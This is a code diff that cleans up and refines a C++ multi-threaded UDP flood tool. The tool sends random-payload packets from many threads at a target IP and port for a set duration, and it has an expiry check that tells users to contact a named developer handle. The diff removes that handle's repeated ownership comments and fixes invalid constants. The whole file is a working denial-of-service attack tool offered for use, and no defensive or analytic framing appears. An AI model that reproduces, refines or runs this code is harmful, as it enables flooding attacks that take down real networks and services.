@@ -1,69 +1,43 @@
-#include <iostream>//#THIS FILE OWNER IS @NNUCLEAR_OP
+#include <iostream>
+#include <cstring>
+#include <cstdlib>
+#include <ctime>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <vector>
+#include <thread>
+#include <mutex>
 
-#include <cstring>//#THIS FILE OWNER IS @NNUCLEAR_OP
+// Constants
+#define PACKET_SIZE 65507  // Maximum UDP payload size (65507 bytes)
+#define PAYLOAD_SIZE 1450  // Recommended payload size for most networks
 
-#include <cstdlib>//#THIS FILE OWNER IS @NNUCLEAR_OP
+const int EXPIRY_DAY = 30;
+const int EXPIRY_MONTH = 12;
+const int EXPIRY_YEAR = 2026;
 
-#include <ctime>//#THIS FILE OWNER IS @NNUCLEAR_OP
-
-#include <netinet/in.h>//#THIS FILE OWNER IS @NNUCLEAR_OP
-
-#include <arpa/inet.h>//#THIS FILE OWNER IS @NNUCLEAR_OP
-
-#include <unistd.h>//#THIS FILE OWNER IS @NNUCLEAR_OP
-
-#include <sys/socket.h>//#THIS FILE OWNER IS @NNUCLEAR_OP
-
-#include <sys/types.h>//#THIS FILE OWNER IS @NNUCLEAR_OP
-
-#include <vector>//#THIS FILE OWNER IS @NNUCLEAR_OP
-
-#include <thread>//#THIS FILE OWNER IS @NNUCLEAR_OP
-
-#include <mutex>//#THIS FILE OWNER IS @NNUCLEAR_OP
-
-
-#define PACKET_SIZE 9999999  //#THIS FILE OWNER IS @NNUCLEAR_OP
-
-#define PAYLOAD_SIZE 1400  ////#THIS FILE OWNER IS @NNUCLEAR_OP
-
-//#THIS FILE OWNER IS @NNUCLEAR_OP
-
-const int EXPIRY_DAY = 30;//#THIS FILE OWNER IS @NNUCLEAR_OP
-
-const int EXPIRY_MONTH = 22;  // //#THIS FILE OWNER IS @NNUCLEAR_OP
-
-const int EXPIRY_YEAR = 2026;//#THIS FILE OWNER IS @NNUCLEAR_OP
-
-
-//#THIS FILE OWNER IS @NNUCLEAR_OP
-
-const int DEFAULT_THREAD_COUNT = 800;//#THIS FILE OWNER IS @NNUCLEAR_OP
-
-
-//#THIS FILE OWNER IS @NNUCLEAR_OP
+const int DEFAULT_THREAD_COUNT = 800;
 
 std::mutex log_mutex;
 
-// Function to generate a random payload for UDP packets
+// Function to generate a random payload
 void generate_payload(char *buffer, size_t size) {
-    static const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";//#THIS FILE OWNER IS @NNUCLEAR_OP
-
+    static const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
     for (size_t i = 0; i < size; ++i) {
         buffer[i] = charset[rand() % (sizeof(charset) - 1)];
     }
 }
 
-//#THIS FILE OWNER IS @NNUCLEAR_OP
-
+// Function to check if the binary has expired
 bool is_binary_expired() {
     time_t now = time(nullptr);
     struct tm *current_time = localtime(&now);
 
-    if ((current_time->tm_year + 1900 > EXPIRY_YEAR) ||//#THIS FILE OWNER IS @NNUCLEAR_OP
-
-        (current_time->tm_year + 1900 == EXPIRY_YEAR && current_time->tm_mon + 1 > EXPIRY_MONTH) ||//#THIS FILE OWNER IS @NNUCLEAR_OP
-
+    if ((current_time->tm_year + 1900 > EXPIRY_YEAR) ||
+        (current_time->tm_year + 1900 == EXPIRY_YEAR && current_time->tm_mon + 1 > EXPIRY_MONTH) ||
         (current_time->tm_year + 1900 == EXPIRY_YEAR && current_time->tm_mon + 1 == EXPIRY_MONTH &&
          current_time->tm_mday > EXPIRY_DAY)) {
         return true;
@@ -71,8 +45,7 @@ bool is_binary_expired() {
     return false;
 }
 
-//#THIS FILE OWNER IS @NNUCLEAR_OP
-
+// UDP attack function for each thread
 void udp_attack_thread(const char *ip, int port, int attack_time, int thread_id) {
     sockaddr_in server_addr{};
     char buffer[PAYLOAD_SIZE];
@@ -85,8 +58,6 @@ void udp_attack_thread(const char *ip, int port, int attack_time, int thread_id)
         return;
     }
 
-  //#THIS FILE OWNER IS @NNUCLEAR_OP
-
     server_addr.sin_family = AF_INET;
     server_addr.sin_port = htons(port);
     if (inet_pton(AF_INET, ip, &server_addr.sin_addr) <= 0) {
@@ -96,11 +67,7 @@ void udp_attack_thread(const char *ip, int port, int attack_time, int thread_id)
         return;
     }
 
-    //#THIS FILE OWNER IS @NNUCLEAR_OP
-
     generate_payload(buffer, PAYLOAD_SIZE);
-
-    //#THIS FILE OWNER IS @NNUCLEAR_OP
 
     time_t start_time = time(nullptr);
     while (time(nullptr) - start_time < attack_time) {
@@ -116,33 +83,31 @@ void udp_attack_thread(const char *ip, int port, int attack_time, int thread_id)
     std::cout << "Thread " << thread_id << " completed its attack." << std::endl;
 }
 
-// Function to run the UDP attack in multiple threads
+// Multi-threaded UDP attack manager
 void multi_threaded_udp_attack(const char *ip, int port, int attack_time, int thread_count) {
     std::vector<std::thread> threads;
 
-    std::cout << "LAUNCHING MULTI-THREADED UDP FLOOD ATTACK WITH @NNUCLEAR_OP" << thread_count << " threads..." << std::endl;
+    std::cout << "Starting UDP flood attack with " << thread_count << " threads..." << std::endl;
 
-    // Create and start threads
     for (int i = 0; i < thread_count; ++i) {
         threads.emplace_back(udp_attack_thread, ip, port, attack_time, i + 1);
     }
 
-    // Wait for all threads to finish
     for (auto &thread : threads) {
         if (thread.joinable()) {
             thread.join();
         }
     }
 
-    std::cout << "MULTI-THREADED ATTACK COMPLETED.OWNER:- @NNUCLEAR_OP" << std::endl;
+    std::cout << "UDP flood attack completed." << std::endl;
 }
 
-// Function to get the number of threads from the command line arguments or use a default value
+// Get thread count from command line arguments or use default
 int get_thread_count(int argc, char *argv[]) {
     if (argc == 5) {
-        return std::stoi(argv[4]);  // Get thread count from argument if provided
+        return std::stoi(argv[4]);
     }
-    return DEFAULT_THREAD_COUNT;  // Use default thread count if not provided
+    return DEFAULT_THREAD_COUNT;
 }
 
 int main(int argc, char *argv[]) {
@@ -154,16 +119,14 @@ int main(int argc, char *argv[]) {
     const char *ip = argv[1];
     int port = std::stoi(argv[2]);
     int duration = std::stoi(argv[3]);
-    int thread_count = get_thread_count(argc, argv);  // Determine thread count
+    int thread_count = get_thread_count(argc, argv);
 
-    // Check if the binary has expired
     if (is_binary_expired()) {
-        std::cerr << "ERROR: THIS BINARY HAS EXPIRED. PLEASE CONTACT THE DEVELOPER @NNUCLEAR_OP." << std::endl;
+        std::cerr << "Error: This binary has expired. Please contact @NNUCLEAR_OP." << std::endl;
         return EXIT_FAILURE;
-    } //#THIS FILE OWNER IS @NNUCLEAR_OP
+    }
 
-    // Perform the multi-threaded attack
     multi_threaded_udp_attack(ip, port, duration, thread_count);
 
     return EXIT_SUCCESS;
-} //#THIS FILE OWNER IS @NNUCLEAR_OP
+}
